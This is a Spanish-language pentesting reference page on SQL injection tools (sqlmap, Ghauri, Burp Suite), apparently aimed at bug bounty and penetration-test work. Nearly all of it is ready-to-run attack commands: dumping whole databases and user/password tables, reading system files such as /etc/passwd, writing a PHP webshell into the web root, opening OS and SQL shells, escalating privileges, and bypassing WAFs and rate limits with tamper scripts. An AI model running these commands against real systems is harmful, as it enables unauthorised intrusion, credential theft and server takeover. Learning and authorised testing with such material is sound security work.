---
icon: database
---

# Herramientas y recursos

### SQLmap

La herramienta más completa para automatizar la detección y explotación de SQLi.

#### Instalación

```bash
# Clonar repo oficial
git clone https://github.com/sqlmapproject/sqlmap.git

# O instalar vía pip
pip install sqlmap

# Uso básico
python3 sqlmap.py -u "https://target.com/item?id=1"
```

#### Comandos esenciales

**Detección básica**

```bash
# URL con parámetro GET
sqlmap -u "https://target.com/item?id=1"

# Parámetros POST
sqlmap -u "https://target.com/login" --data="username=admin&password=test"

# Desde una petición guardada de Burp (más completo)
sqlmap -r request.txt

# Especificar parámetro vulnerable
sqlmap -u "https://target.com/item?id=1&cat=2" -p id

# Añadir cookie de sesión
sqlmap -u "https://target.com/item?id=1" --cookie="session=abc123"

# Añadir headers
sqlmap -u "https://target.com/item?id=1" -H "Authorization: Bearer token123"
```

**Enumeración**

```bash
# Obtener banner del DBMS
sqlmap -u "..." --banner

# Obtener usuario actual de la DB
sqlmap -u "..." --current-user

# Obtener base de datos actual
sqlmap -u "..." --current-db

# Listar todas las bases de datos
sqlmap -u "..." --dbs

# Listar tablas de una BD
sqlmap -u "..." -D nombre_db --tables

# Listar columnas de una tabla
sqlmap -u "..." -D nombre_db -T nombre_tabla --columns

# Dump de una tabla completa
sqlmap -u "..." -D nombre_db -T nombre_tabla --dump

# Dump de columnas específicas
sqlmap -u "..." -D nombre_db -T nombre_tabla -C "username,password" --dump

# Dump de toda la base de datos
sqlmap -u "..." -D nombre_db --dump-all

# Dump de todo (todas las BDs)
sqlmap -u "..." --dump-all
```

**Técnicas específicas**

```bash
# Forzar técnica específica
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
sqlmap -u "..." --technique=U       # solo Union-Based
sqlmap -u "..." --technique=BT      # Boolean + Time
sqlmap -u "..." --technique=BEUSTQ  # todas

# Especificar DBMS manualmente (ahorra tiempo de detección)
sqlmap -u "..." --dbms=mysql
sqlmap -u "..." --dbms=postgresql
sqlmap -u "..." --dbms=mssql
sqlmap -u "..." --dbms=oracle
```

**Bypass de WAF con tamper scripts**

```bash
# Ver todos los tamper scripts disponibles
ls $(python3 -c "import sqlmap; print(sqlmap.__file__.replace('__init__.py',''))")tamper/

# Uso de tamper scripts
sqlmap -u "..." --tamper=space2comment
sqlmap -u "..." --tamper=between,randomcase,space2comment
sqlmap -u "..." --tamper=charencode
sqlmap -u "..." --tamper=modsecurityversioned

# Tamper scripts más útiles
# space2comment     → reemplaza espacios por /**/
# between           → reemplaza > con NOT BETWEEN
# randomcase        → aleatoriza mayúsculas/minúsculas
# charencode        → URL-encode de caracteres
# base64encode      → codifica en base64
# equaltolike       → reemplaza = con LIKE
# greatest          → reemplaza > con GREATEST
# modsecurityversioned → comentarios versionados MySQL
```

**Explotación avanzada**

```bash
# Leer archivo del sistema
sqlmap -u "..." --file-read="/etc/passwd"
sqlmap -u "..." --file-read="C:\\Windows\\win.ini"

# Escribir archivo (webshell)
sqlmap -u "..." --file-write="./shell.php" --file-dest="/var/www/html/shell.php"

# Ejecutar comandos del SO
sqlmap -u "..." --os-cmd="whoami"

# Shell interactiva del SO
sqlmap -u "..." --os-shell

# Shell interactiva de la DB
sqlmap -u "..." --sql-shell

# Escalar privilegios (MSSQL xp_cmdshell)
sqlmap -u "..." --priv-esc
```

**Flags de rendimiento y evasión**

```bash
# Nivel de tests (1-5, por defecto 1)
sqlmap -u "..." --level=3      # testea más parámetros (headers, cookies)
sqlmap -u "..." --level=5      # testea todo incluyendo User-Agent, Referer

# Riesgo de los payloads (1-3, por defecto 1)
sqlmap -u "..." --risk=2       # más agresivo
sqlmap -u "..." --risk=3       # puede hacer UPDATE/DELETE (cuidado en producción)

# Delay entre peticiones (evasión de rate limiting)
sqlmap -u "..." --delay=1      # 1 segundo entre requests

# Timeout
sqlmap -u "..." --timeout=30

# Retries en caso de error
sqlmap -u "..." --retries=3

# Threads
sqlmap -u "..." --threads=5

# Proxy (para ver en Burp)
sqlmap -u "..." --proxy="http://127.0.0.1:8080"

# Verbose (1-6)
sqlmap -u "..." -v 3
```

**Workflow típico con Burp**

```bash
# 1. Capturar la petición en Burp → Save item → request.txt

# 2. Detección básica
sqlmap -r request.txt --dbs

# 3. Enumerar tablas de la BD encontrada
sqlmap -r request.txt -D target_db --tables

# 4. Dump de usuarios
sqlmap -r request.txt -D target_db -T users --dump

# 5. Si hay WAF
sqlmap -r request.txt -D target_db -T users --dump --tamper=space2comment,randomcase --random-agent
```

### Ghauri

Alternativa más moderna a sqlmap, con mejor soporte para WAF bypass.

```bash
# Instalación
pip3 install ghauri

# Uso básico
ghauri -u "https://target.com/item?id=1"

# Con request file
ghauri -r request.txt

# Técnicas y dump
ghauri -u "..." --dbs
ghauri -u "..." -D target_db --tables
ghauri -u "..." -D target_db -T users --dump
```

### Burp Suite

Burp es esencial para identificar y explotar SQLi manualmente.

#### Detección con Scanner (Pro)

```
Target → Site map → clic derecho sobre el request → Scan
Active Scan → SQLi detectado automáticamente
```

#### Explotación manual con Repeater

```
1. Interceptar la petición → Send to Repeater
2. Modificar el parámetro vulnerable
3. Enviar y analizar la respuesta
4. Iterar con distintos payloads
```

#### Fuerza bruta con Intruder

```
1. Send to Intruder
2. Marcar posición del payload (§payload§)
3. Cargar lista de payloads SQLi
4. Buscar diferencias en respuestas (longitud, contenido)

-- Listas de payloads recomendadas:
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
-- SecLists/Fuzzing/SQLi/
```

### Recursos y referencias

| Recurso                       | URL                                                                                                                                                                      |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| PayloadsAllTheThings - SQLi   | [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)       |
| PortSwigger SQLi Labs         | [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)                                                                 |
| sqlmap docs                   | [https://sqlmap.org](https://sqlmap.org/)                                                                                                                                |
| HackTricks SQLi               | [https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)                                                     |
| PentestMonkey SQLi cheatsheet | [http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) |

> Usar sqlmap con `-r request.txt` es más fiable que con `-u`, ya que replica exactamente la petición capturada incluyendo todos los headers y cookies.

> Antes de automatizar con sqlmap, siempre confirmar la inyección manualmente en Burp para entender bien el comportamiento de la aplicación.

> En entornos de producción (bug bounty, pentests reales), usar `--risk=1 --level=1` por defecto y subir gradualmente. El `--risk=3` puede hacer modificaciones en la base de datos.
